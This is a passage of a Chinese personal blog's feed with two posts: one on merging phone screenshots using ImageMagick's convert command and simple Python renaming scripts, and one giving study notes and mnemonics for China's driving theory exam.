    <link href="http://zssblog.top/2020/06/03/%E7%94%B1%E5%BF%AB%E9%80%9F%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://zssblog.top/2020/06/03/%E7%94%B1%E5%BF%AB%E9%80%9F%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</id>
    <published>2020-06-03T01:46:00.000Z</published>
    <updated>2020-06-03T01:47:37.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>我在上篇文章里分享了自己的科目一经验：<a href="http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF%87%E5%AE%9D%E5%85%B8/">点我查看</a>，但细心地大家会发现在图片标题下都是手机截屏的图片合并成一张的，在次记录下整个合并过程(linux+python)。</p><h1 id="mu-de">目的</h1><p>手机上的图片都是长方形显然不可能直接一张就显示在页面上，为此我们需要每几张合并成一张优化体验。<br>起初我尝试在线网站合并图片，奈何总共100多张图片太麻烦了，这一点不符合一个it行业的人做的事(hhha)。<br>于是突然想到可以用Linux的convert命令。</p><p>以下命令代表将1.jpg、2.jpg、3.jpg水平合并成new1.jpg</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert +append <span class="number">1</span>.jpg <span class="number">2</span>.jpg <span class="number">3</span>.jpg new1.jpg</span><br></pre></td></tr></table></figure><h1 id="zhao-shou-qu-zuo">着手去做</h1><p>由于是手机上的图片传到电脑上的，文件名杂乱不齐。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602223548569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>首先我们需要先让每个图片的名字有序化<br>于是我写了个简单的Python脚本将其命名为1、2、3等名称</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">"/home/zss/Desktop/kemuyi"</span></span><br><span class="line">pic_list = os.listdir(path)</span><br><span class="line">n=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pic_list:</span><br><span class="line">os.rename(i,<span class="string">"./"</span>+str(n)+<span class="string">".jpg"</span>)</span><br><span class="line">n+=<span class="number">1</span></span><br><span class="line">print(<span class="string">"重命名成功"</span>)</span><br></pre></td></tr></table></figure><p>结果如下<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602223736194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>接下来就是重复的使用convert命令来合并这些图片。本来我是想用shell脚本来直接执行，奈何过了半年老师讲的shell脚本知识早已还给老师了。<br>这时候还是得祭出Python，我们可以用Python把这些命令输出出来，然后再执行下就可，说干就干。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string=<span class="string">"convert +append "</span></span><br><span class="line">houzhui=<span class="string">".jpg "</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">44</span>):</span><br><span class="line">print(string,end=<span class="string">""</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">print(str(<span class="number">3</span>*m+n+<span class="number">1</span>)+houzhui,end=<span class="string">""</span>)</span><br><span class="line">print(<span class="string">"new"</span>+str(m+<span class="number">1</span>)+<span class="string">".jpg"</span>)</span><br></pre></td></tr></table></figure><p>运行结果如下<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602224055827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>接下来只需将这些命令复制到shell脚本中执行即可。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602224155115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>这里放一张合并后的照片<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602224309544.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>至此全部完成。</p><h1 id="xie-zai-hou-mian">写在后面</h1><p>通过简单的小案例让我更加明白改变生活的不是科技，而是Linux+Python(手动加狗头🐶)。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;我在上篇文章里分享了自己的科目一经验：&lt;a href=&quot;http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>科目一必过宝典</title>
    <link href="http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF%87%E5%AE%9D%E5%85%B8/"/>
    <id>http://zssblog.top/2020/06/02/%E7%A7%91%E7%9B%AE%E4%B8%80%E5%BF%85%E8%BF%87%E5%AE%9D%E5%85%B8/</id>
    <published>2020-06-02T14:48:17.000Z</published>
    <updated>2020-06-03T02:00:13.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>科目一今天满分飘过，特此分享下自己打的笔记。<br>如果你想问我只是科目一而已用的着那么认真吗，别问，问就是因为没复习挂过一次。<br>之所以写这篇文章的原因是提醒大家当时我是过了全部题后之后只做某考宝典的模拟题，一直是95以上，但考试的时候发现考试比手机模拟难的多，好多易错题手机模拟根本碰不到，这里建议大家用网页版的模拟。另外只要大家把我发的知识点记住图片题目看了之后过绝对没问题。<br>建议考前一天把全部题再做一遍，我是昨天用了几个小时过了一遍总共错了3道，今天考试的时候发现总共有3题不是题库里的，不过知识点都是一样的。科目一虽说较简单的一科，但也不要掉以轻心，小心成为下一个我，haha。如果有其他疑问，随时欢迎咨询。<br>如果你对图片标题下的为什么能合并3张手机图片感兴趣，请查看我的另一篇文章：<a href="http://zssblog.top/2020/06/03/%E7%94%B1%E5%BF%AB%E9%80%9F%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/">由快速合并图片引发的思考</a></p><h1 id="zhi-shi-dian-su-ji">知识点速记</h1><p>1.有线城5公7，没线城3公4</p><p>有中心线城市城市限速50km/h,公路限速70km/h</p><p>2.右让左，左让直，转弯让直行</p><p>3.没有图的问题速度都不能超30km/h</p><p>4.假一吊二撤三醉五逃终生</p><p>虚假资料一年内不得重新申请驾照</p><p>5.能见度261,145,520</p><p>能见度小于200m,限速60，保持100m的距离</p><p>能见度小于50，限速20，尽快离开高速</p><p>6.高速故障在150m外放警告标志，一般路50-100m放</p><p>7.事故有伤亡就立即抢救否则立即都是错的</p><p>8.一条虚线(2个车道)一个1(最左边100)，两条虚线两个1</p><p>两条车道：10060</p><p>三条车道：1109060</p><p>四条车道：110909060</p><p>9.站30米内不停车   加油站、公交车站</p><p>口50米内不停车交叉路口、陡坡</p><p>10.高速公路不系安全带罚款50扣2分，一般路罚款50不扣分</p><p>11.==无证驾驶不算危险驾驶==</p><p>12.开车打电话扣2分</p><p>13.有人身伤亡就必须得报警</p><p>14.右转进入高速公路也是开左转向灯（左进右出）</p><p>15.驾驶证过期前90天申请换驾驶证</p><p>16.有罚找罚，没罚找吊，20元的罚不要</p><p>17.追逐竞驶拘留罚款不会判刑</p><p>18.信息变化30天备案，丢，毁，过期的90天补办（没有90就选30）</p><p>19.酒精含量20-80酒驾，80以上醉驾</p><p>20.所有人，行驶证去登记地。驾驶人，驾驶证去核发地</p><p>21.有争议就得报警</p><p>22.从左到右是离合踏板，制动踏板，加速踏板</p><p>23.转向灯上提是右转向灯(古代以右为尊)</p><p>24.汽车找汽车（准驾汽车可以开选项中的汽车），自动找自动</p><p>25.判断题罚款出现200的（200-2000也算）就对</p><p>26.判断题横着的红绿灯都错，竖着的红绿灯都对</p><p>27.客运驾驶人在24小时内累计驾驶时间不得超过<strong>8小时</strong>，连续驾驶时间不得超过4小时，每次停车休息时间不少于20分钟。</p><p>28.交警左手上下摆动是左转弯待转，右手是减速</p><p>29.驾驶证有效期为6年、10年、终身。</p><h1 id="qi-ta-zong-jie">其他总结</h1><h2 id="wei-xian-jia-shi" id="危险驾驶"><a class="header-anchor" href="#危险驾驶">¶</a>危险驾驶</h2><ul><li>追逐竞驶，情节恶劣</li><li><strong>醉酒驾驶</strong></li><li>拉人的严重超载或超速</li><li>拉化学品不按规定的</li></ul><p>==无证驾驶不算危险驾驶==</p><h2 id="jiao-jing-shou-shi" id="交警手势"><a class="header-anchor" href="#交警手势">¶</a>交警手势</h2><p>1.交警手势剪刀手就是转弯，面向谁从哪看，交警手指哪个方向就是啥转弯</p><p>2.交警手在心口就是变道（人心善变）</p><p>3.右手手势从高（速度快）到低（速度慢）就是减速</p><p>4.靠边停车一个手伸超过头顶（停车），转弯时一个手平伸</p><h2 id="kou-fen-zong-jie" id="扣分总结"><a class="header-anchor" href="#扣分总结">¶</a>扣分总结</h2><p>不按规定会车扣1分</p><p>高速打电话扣2分</p><p>违反交通禁令标志扣3分</p><p>出事不放危险报警闪光灯扣3分</p><p>高速逆行扣12分普通扣3</p><p>扣6分的有</p><ul><li>违反交通信号灯</li><li>占用应急车道</li><li>不避让校车</li><li>高速低于能见度200m速度超过60的</li></ul><h2 id="wei-fa-pan-xing-ti" id="违法判刑题"><a class="header-anchor" href="#违法判刑题">¶</a>违法判刑题</h2><p>1、不跑3年以下(不管死没死)，跑了3-7，因跑致死7年以上</p><p>2、违反交规发生重大事故致人重伤的：3年以下。（没跑）</p><p>3、违反交规发生重大事故使公私财产遭受重大损失的：3年以下。（没跑）</p><p>4、违反交规发生重大事故致人死亡且逃逸的：3年以上7年以下。（跑了）</p><p>5、违反交规发生重大事故因逃逸导致他人死亡的：7年以上。（因为跑才死）</p><h2 id="wei-fa-fa-kuan-ti" id="违法罚款题"><a class="header-anchor" href="#违法罚款题">¶</a>违法罚款题</h2><p>1、 罚款200-500元：客运车超员没超过20%的、货运车超载没超过30%的。（若超员超载超过了罚500-2000）</p><p>2、 罚款200-2000元：未取得机动车驾驶证、机动车驾驶证被吊销或者机动车驾驶证被暂扣期间驾驶机动车的；将机动车交由未取得机动车驾驶证或者机动车驾驶证被吊销、暂扣的人驾驶的；造成交通事故后逃逸，尚不构成犯罪的；机动车行驶超过规定时速50%的。（无证、交给无证、逃逸、超速50）</p><p>3、 罚款1000-2000元：饮酒后驾驶机动车的. 因饮酒后驾驶机动车被处罚，再次饮酒后驾驶机动车的。(酒驾注意不是醉驾)</p><p>4、 罚款2000-5000元：使用其他车辆的机动车登记证书、号牌、行驶证、检验合格标志、保险标志的；伪造、变造或者使用伪造、变造的机动车登记证书、号牌、行驶证、驾驶证的。(伪造作假)</p><p>5.饮酒驾驶<strong>营运机动车</strong>，处十五日拘留，并罚款<strong>5000</strong>（营运车罚的多）</p><h2 id="ren-che-zong-jie" id="人车总结"><a class="header-anchor" href="#人车总结">¶</a>人车总结</h2><p>只要机动车上路行驶，就必须悬挂号牌，放置检验合格标志、保险标志，随车携带行驶证和驾驶证。</p><p>缺少任何一项，交警都可以依法扣留车辆， ==不存在扣留行驶证的说法==。</p><p>其实可以理解为一个知识点，就是：到底是车有问题，还是人有问题！</p><p>只要车有问题，就扣车；人有问题就吊销驾照；如果人有问题车也有问题，那就吊销驾照并收缴车辆！不涉及到犯罪的，不会拘留人！</p><p>**车有问题指：**伪造、变造与车有关的一切证件、牌号，以及未放置保险证，所以处罚是扣车。</p><p>**人有问题指：**伪造，变造与驾驶有关的一切证件、严重违反交规如饮酒等，所以处罚是吊销驾照。</p><p>**人、车都有问题：**驾驶拼改装、报废车辆，处罚是吊销驾照并收缴车辆。</p><h1 id="tu-pian">图片</h1><p>所有图片百度网盘资源：<a href="https://pan.baidu.com/s/1-H_38X3wiWxOxIvoMKcPuA" target="_blank" rel="noopener">点我查看</a>，提取码：vafs<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844577.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844487.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844463.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844431.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221844233.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914887.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914851.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914796.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914786.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221914663.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221912798.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221912581.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222191173.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222191110.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948591.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948571.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948480.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948468.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221948246.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221947874.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221947371.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222194711.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221946643.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221946550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221946328.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221945457.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602221941722.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026522.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026410.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026404.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026382.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026278.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222026274.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222202633.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025996.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025992.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025906.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222025129.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020060222202532.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222021952.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222021382.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222054180.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200602222053744.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzE2MDMzOTU4My5wbmc?x-oss-process=image/format,png"  alt="image-20200517160339583"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzE2MDI1MzUwNC5wbmc?x-oss-process=image/format,png"  alt="image-20200517160253504"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNjIyMTczOTgyMi5wbmc?x-oss-process=image/format,png"  alt="image-20200517122511156"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwMjMzOTE1OC5wbmc?x-oss-process=image/format,png"  alt="image-20200517202339158"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwMzkwODc0Ni5wbmc?x-oss-process=image/format,png"  alt="image-20200517203908746"></p><p><img src="/" class="lazyload" data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3pzczE5Mi9UeXBvcmEtbm90ZXNAbGF0ZXN0L2ltYWdlcy9pbWFnZS0yMDIwMDUxNzIwNTkxMjU1Ni5wbmc?x-oss-process=image/format,png"  